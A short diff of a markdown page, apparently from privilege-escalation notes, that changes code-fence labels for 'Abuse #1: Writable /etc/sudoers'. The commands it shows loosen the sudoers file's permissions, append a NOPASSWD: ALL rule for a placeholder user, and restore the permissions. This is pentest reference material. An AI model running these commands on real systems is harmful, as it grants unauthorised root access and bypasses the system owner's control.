@@ -4,20 +4,19 @@ date: 2024-7-3
 tags: ["sudoers", "sudo", "privesc", "/etc/sudoers"]
 ---
 
----
 #### Abuse #1: Writable /etc/sudoers
 
 <div>
 
-```bash
+```console
 chmod 600 /etc/sudoers
 ```
 
-```bash
+```console
 echo '<USER>   ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers
 ```
 
-```bash
+```console
 chmod 440 /etc/sudoers
 ```
 
